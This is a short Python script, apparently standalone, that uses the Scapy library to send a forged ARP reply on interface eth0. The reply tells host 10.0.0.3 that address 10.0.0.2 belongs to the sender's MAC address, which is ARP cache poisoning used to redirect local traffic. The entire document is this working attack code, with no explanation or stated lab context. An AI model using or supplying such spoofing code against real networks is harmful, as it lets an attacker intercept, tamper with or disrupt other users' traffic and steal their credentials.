from scapy.all import *

a = Ether(src=get_if_hwaddr("eth0"), dst="ff:ff:ff:ff:ff:ff") / ARP(
    op="is-at",
    hwsrc=get_if_hwaddr("eth0"),
    psrc="10.0.0.2",
    hwdst="ff:ff:ff:ff:ff:ff",
    pdst="10.0.0.3",
)
sendp(a, iface="eth0")
